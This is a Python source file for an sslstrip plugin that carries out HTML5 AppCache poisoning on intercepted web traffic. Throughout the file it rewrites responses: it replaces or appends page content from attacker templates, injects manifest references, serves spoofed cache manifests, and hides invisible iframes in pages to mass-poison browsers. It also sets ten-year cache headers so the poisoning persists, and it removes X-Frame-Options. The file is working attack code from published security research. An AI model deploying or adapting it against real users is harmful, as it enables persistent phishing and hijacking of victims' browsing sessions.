# Copyright (c) 2004-2009 Moxie Marlinspike, Krzysztof Kotowicz
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, os.path, time
from datetime import date
from sslstrip.DummyResponseTamperer import DummyResponseTamperer

class AppCachePoison(DummyResponseTamperer):

    '''
    AppCachePosion performs HTML5 AppCache poisioning attack - see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html
    '''
    
    mass_poisoned_browsers = []

    def tamper(self, url, data, headers, req_headers, ip):
        if not self.isEnabled():
          return data
        
        if "enable_only_in_useragents" in self.config:
            regexp = self.config["enable_only_in_useragents"]
            if regexp and not re.search(regexp,req_headers["user-agent"]):
                logging.log(logging.DEBUG, "Tampering disabled in this useragent (%s)" % (req_headers["user-agent"]))
                return data
               
        urls = self.urlMonitor.getRedirectionSet(url)
        
        (s,element,url) = self.getSectionForUrls(urls)
        if not s:
          data = self.tryMassPoison(url, data, headers, req_headers, ip)
          return data
        logging.log(logging.WARNING, "Found URL %s in section %s" % (url, s['__name__']))
        p = self.getTemplatePrefix(s)
        if element == 'tamper':
          logging.log(logging.WARNING, "Poisoning tamper URL with template %s" % (p))
          if os.path.exists(p + '.replace'): # replace whole content
            f = open(p + '.replace','r')
            data = self.decorate(f.read(), s)
            f.close()

          elif os.path.exists(p + '.append'): # append file to body
            f = open(p + '.append','r')
            appendix = self.decorate(f.read(), s)
            f.close()
            # append to body
            data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)

          # add manifest reference
          data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
          
        elif element == "manifest":
          logging.log(logging.WARNING, "Poisoning manifest URL")
          data = self.getSpoofedManifest(url, s)
          headers.setRawHeaders("Content-Type", ["text/cache-manifest"])

        elif element == "raw": # raw resource to modify, it does not have to be html
          logging.log(logging.WARNING, "Poisoning raw URL")
          if os.path.exists(p + '.replace'): # replace whole content
            f = open(p + '.replace','r')
            data = self.decorate(f.read(), s)
            f.close()

          elif os.path.exists(p + '.append'): # append file to body
            f = open(p + '.append','r')
            appendix = self.decorate(f.read(), s)
            f.close()
            # append to response body
            data += appendix
        
        self.cacheForFuture(headers)
        self.removeDangerousHeaders(headers)
        return data

    def tryMassPoison(self, url, data, headers, req_headers, ip):
        browser_id = ip + req_headers.get("user-agent", "")

        if not 'mass_poison_url_match' in self.config: # no url
            return data
        if browser_id in self.mass_poisoned_browsers: #already poisoned
            return data
        if not headers.hasHeader('content-type') or not re.search('html(;|$)', headers.getRawHeaders('content-type')[0]): #not HTML
            return data
        if 'mass_poison_useragent_match' in self.config and not "user-agent" in req_headers:
            return data
        if not re.search(self.config['mass_poison_useragent_match'], req_headers['user-agent']): #different UA
            return data
        if not re.search(self.config['mass_poison_url_match'], url): #different url
            return data
        
        logging.log(logging.WARNING, "Adding AppCache mass poison for URL %s, id %s" % (url, browser_id))
        appendix = self.getMassPoisonHtml()
        data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)
        self.mass_poisoned_browsers.append(browser_id) # mark to avoid mass spoofing for this ip
        return data

    def getMassPoisonHtml(self):
        html = "<div style=\"position:absolute;left:-100px\">"
        for i in self.config:
            if isinstance(self.config[i], dict):
                if self.config[i].has_key('tamper_url') and not self.config[i].get('skip_in_mass_poison', False):
                    html += "<iframe sandbox=\"\" style=\"opacity:0;visibility:hidden\" width=\"1\" height=\"1\" src=\"" + self.config[i]['tamper_url'] + "\"></iframe>" 

        return html + "</div>"
        
    def cacheForFuture(self, headers):
        ten_years = 315569260
        headers.setRawHeaders("Cache-Control",["max-age="+str(ten_years)])
        headers.setRawHeaders("Last-Modified",["Mon, 29 Jun 1998 02:28:12 GMT"]) # it was modifed long ago, so is most likely fresh
        in_ten_years = date.fromtimestamp(time.time() + ten_years)
        headers.setRawHeaders("Expires",[in_ten_years.strftime("%a, %d %b %Y %H:%M:%S GMT")])

    def removeDangerousHeaders(self, headers):
        headers.removeHeader("X-Frame-Options")

    def getSpoofedManifest(self, url, section):
        p = self.getTemplatePrefix(section)
        if not os.path.exists(p+'.manifest'):
          p = self.getDefaultTemplatePrefix()

        f = open(p + '.manifest', 'r')
        manifest = f.read()
        f.close()
        return self.decorate(manifest, section)

    def decorate(self, content, section):
        for i in section:
          content = content.replace("%%"+i+"%%", section[i])
        return content

    def getTemplatePrefix(self, section):
        if section.has_key('templates'):
          return self.config['templates_path'] + '/' + section['templates']

        return self.getDefaultTemplatePrefix()

    def getDefaultTemplatePrefix(self):
          return self.config['templates_path'] + '/default'

    def getManifestUrl(self, section):
      return section.get("manifest_url",'/robots.txt')

    def getSectionForUrls(self, urls):
        for url in urls:
            for i in self.config:
              if isinstance(self.config[i], dict): #section
                section = self.config[i]
                if section.get('tamper_url',False) == url:
                  return (section, 'tamper',url)
                if section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url):
                  return (section, 'tamper',url)
                if section.get('manifest_url',False) == url:
                  return (section, 'manifest',url)
                if section.get('raw_url',False) == url:
                  return (section, 'raw',url)

        return (False,'',urls.copy().pop())

